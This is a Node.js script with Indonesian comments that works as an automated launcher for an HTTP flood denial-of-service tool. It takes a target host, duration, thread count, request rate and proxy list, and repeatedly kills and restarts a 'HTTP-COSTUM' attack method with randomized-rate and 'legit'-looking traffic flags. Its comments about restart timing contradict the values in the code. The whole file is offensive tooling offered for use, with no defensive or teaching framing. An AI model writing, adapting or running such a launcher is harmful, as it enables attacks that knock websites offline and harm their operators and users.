const { exec, execSync } = require("child_process");

const args = process.argv.slice(2);
if (args.length < 5) {
    console.error("Penggunaan: node QUANTUMAUTO.js <host> <time> <thread> <rate> <proxy.txt>");
    process.exit(1);
}

const [host, time, thread, rate, proxy] = args;
let elapsedTime = 0; 
const restartInterval = 1000; // Restart setiap 60 detik
const restartDelay = 0; // Jeda 1 detik sebelum memulai ulang

function runScript() {
    if (elapsedTime >= time) {
        console.log(`\nWaktu ${time} detik sudah habis. Skrip berhenti.`);
        return;
    }

    console.log(`\n[${new Date().toISOString()}] Menjalankan QUANTUM1.js untuk ${host} (Elapsed: ${elapsedTime}/${time} detik)...`);

    try {
        execSync("pkill -9 -f QUANTUM1.js"); // Hentikan proses lama sebelum restart
        console.log("Proses QUANTUM1.js sebelumnya dihentikan.");
    } catch (error) {
        console.log("Tidak ada proses QUANTUM1.js yang berjalan sebelumnya.");
    }

    // Tunggu 1 detik sebelum memulai ulang
    setTimeout(() => {
        const process = exec(`node /root/methods/HTTP-COSTUM GET "${host}" ${restartInterval} ${rate} ${thread} ${proxy} --postdata "id=123&action=submit" --full --randrate --legit`);

        process.stdout.on("data", (data) => console.log(data.toString()));
        process.stderr.on("data", (data) => console.error(data.toString()));

        setTimeout(() => {
            elapsedTime += restartInterval;
            runScript();
        }, restartInterval * 1000); // Restart setiap 60 detik
    }, restartDelay * 1000); // Jeda 1 detik sebelum memulai ulang
}

runScript()
